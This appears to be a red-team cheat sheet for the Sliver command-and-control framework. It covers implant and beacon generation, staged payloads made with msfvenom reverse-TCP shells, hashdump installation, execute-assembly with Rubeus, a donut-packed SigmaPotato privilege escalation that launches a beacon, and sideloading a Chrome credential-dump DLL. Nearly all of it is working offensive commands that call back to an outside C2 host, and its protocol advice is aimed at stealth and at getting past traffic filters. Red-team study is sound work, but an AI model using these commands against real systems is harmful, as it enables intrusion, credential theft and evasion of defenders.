# Content
- [Sliver Communication Protocols](#sliver-communication-protocols)
- [Implants](#implants)
- [Armory](#armory)
- 


# Sliver Communication Protocols
![Architecture](https://github.com/user-attachments/assets/5d6aa18d-6484-42a1-b833-96e29ab9ca9b)
## Choosing the Right Protocol

The selection of a protocol depends on the specific network environment and the attackerâ€™s objectives:

- **Stealth**: DNS and HTTPS are preferred in highly monitored networks.
- **High Bandwidth**: mTLS and HTTPS are better for large data transfers.
- **Internal Pivoting**: Named pipes and TCP pivots are essential for moving laterally within an environment.
- **Bypassing Restrictions**: DNS can bypass most outbound traffic filters.


# Implants 
- Implants are the software (binaries/executables), They offer network connections on different sets of protocols and a means of communication between a C2 server and the target workstation/server.
- Implants can operate in beacon and session modes.
  - **Sessions:** use long-polling connections, which means they use a single TCP connection which is constantly open.
  - **Beacons:** on the other hand call back periodically, and will sleep when not active which can help keep their presence hidden.
```bash
sliver > generate beacon --http <C2 IP>:8088 -N http_beacon --os linux --skip-symbols
sliver > generate --http <C2 IP>:8088 -N http_session --os linux --skip-symbols
sliver > http --lport 8088
```
## Jitter
- Jitter is a randomization mechanism that alters the interval at which beacon signals are sent to the C2 server.
- Example: If a beacon is set to signal every 60 seconds with a 20% jitter, the actual interval will vary randomly between 48 and 72 seconds.
## Stagers
- **Stegeless:**  one single binary that connects back to u
- **Staged:** Dropper, its a smaller payload that when executed, will call back to the C2 server to download and execute the second stage of the payload in-memory, which is where you actually get the beacon to execute.

```bash
# create profile and set a beacon
sliver > profiles new beacon --http <C2 IP>:8088 --format shellcode profile_name # creare beacon
sliver > profiles new --http 10.10.17.67:8088 --format shellcode academy # create session 
sliver > http -L <C2 IP> -l 8088
# just another example:  sliver > profiles new beacon --arch amd64 --os windows --mtls <C2 IP>:443 -f shellcode --timeout 300 --seconds 5 --jitter 1 profile_name 


# use sliver shellcode in msvnom stagger
sliver > stage-listener --url tcp://<C2 IP>:4443 --profile profile_name
sliver > generate stager --lhost <C2 IP> --lport 4443 --format csharp --save staged.txt
# change the shellcode in sliver.aspx with the one generated above
msfvenom -p windows/shell/reverse_tcp LHOST=<C2 IP> LPORT=4443 -f aspx > sliver.aspx

# use msvenom stagger directly 
sliver > stage-listener --url tcp://<C2 IP>:4443 --profile profile_name --prepend-size
msfvenom -p windows/shell/reverse_tcp LHOST=<C2 IP> LPORT=4443 -f aspx > sliver.aspx
```

# Armory
The armory is the Sliver Alias and Extension package manager , it allows you to automatically install various 3rd party tools such as BOFs and .NET tooling.

```bash
armory install hashdump
```

## Alias and Extension
- for more info check [doc](https://sliver.sh/docs?name=Aliases%20and%20Extensions)
### Alias
- Alias is essentially just a thin wrapper around the existing sideload and execute-assembly commands, and aliases cannot have dependencies.
### Extension
- An extension is a shared library that is reflectively loaded into the Sliver implant process, and is passed several callbacks to return data to the implant.
- it's more integrated with Sliver
- extensions' arguments will show up in --help and may be required.

# Execute
- execute
- execute-assembly
- execute-shellcode
- sideload
- spawndll

### execute
execute commands on the target system.
```bash
execute 'C:\Windows\system32\whoami.exe' 
```
### execute-assembly
- run an arbitrary .NET assembly from local system on a remote system via a Sliver implant.
- The implant will start a sacrificial process (`notepad.exe` by default, you can change this by using the --process) that will host a reflective DLL used to load the .NET CLR.
- The assembly will then be copied into this process and a new thread will start on the reflective DLL entrypoint, which will load and run the assembly in memory.
```bash
execute-assembly /opt/binaries/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
```
### execute-shellcode
execute raw shellcode in memory on a target system.
```bash
# make shellcode that make SigmaPotato run http-beacon (which on the target system) and save it in  sigmapotato.bin
donut -i ./SigmaPotato.exe -a 2 -b 2 -p 'c:\temp\http-beacon.exe' -o ./sigmapotato.bin
# create a process that have a usertoken and get the pid
rubeus createnetonly /program:C:\\windows\\system32\\notepad.exe
# execute the shellcode in the target process
execute-shellcode -p 2036 ./sigmapotato.bin 
```
### sideload
- The sideload command allows to load and run code in-memory (Windows/Linux) or via dropping a temporary file to disk. 
- On Windows, the DLL will be converted to a shellcode via [sRDI](https://github.com/monoxgas/sRDI) and injected into a sacrificial process.
```bash
sideload -e ChromeDump /tmp/chrome-dump.dll
```
### spawndll
the spawndll command allows you to inject reflective DLLs and run them in a remote process.
```bash
spawndll /tmp/Outflank-PsC.dll blah
```
